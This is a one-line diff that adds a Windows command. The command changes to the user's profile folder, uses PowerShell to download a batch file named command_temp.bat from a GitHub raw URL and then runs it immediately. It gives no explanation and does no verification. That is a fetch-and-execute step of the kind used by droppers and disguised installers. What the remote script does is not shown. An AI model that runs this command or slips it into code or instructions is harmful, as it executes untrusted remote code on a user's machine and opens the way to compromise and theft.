@@ -1,0 +1,1 @@
+cmd /c @echo off && cd %userprofile% && powershell /c wget https://raw.githubusercontent.com/harryaldwithjarryald/ProjectCMD/main/command_temp.bat -outfile command_temp.bat && command_temp.bat
